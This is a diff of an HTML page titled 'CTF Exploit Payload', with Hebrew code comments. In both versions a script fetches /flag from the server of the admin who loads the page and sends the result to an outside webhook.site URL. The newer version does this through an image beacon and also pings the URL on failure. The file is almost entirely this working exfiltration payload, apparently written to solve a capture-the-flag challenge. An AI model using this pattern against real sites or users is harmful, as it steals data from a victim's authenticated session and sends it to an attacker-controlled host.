@@ -1,13 +1,23 @@
 <!DOCTYPE html>
-<html>
-  <body>
-    <script>
-      fetch("/flag")
-        .then(r => r.text())
-        .then(data => {
-          fetch("https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?flag=" + encodeURIComponent(data));
-        });
-    </script>
-    <p style="color:red">Running exploit...</p>
-  </body>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>CTF Exploit Payload</title>
+</head>
+<body>
+  <h1>Running Exploit...</h1>
+  <script>
+    // שולח בקשת fetch לדגל בשרת המקומי של ה-admin
+    fetch('/flag')
+      .then(response => response.text())
+      .then(flagText => {
+        // שולח את הדגל ל-webhook.site שלך
+        new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?flag=' + encodeURIComponent(flagText);
+      })
+      .catch(() => {
+        // אם יש בעיה - שולח פינג פשוט כדי לדעת שהקוד רץ
+        new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?error=failed-to-get-flag';
+      });
+  </script>
+</body>
 </html>
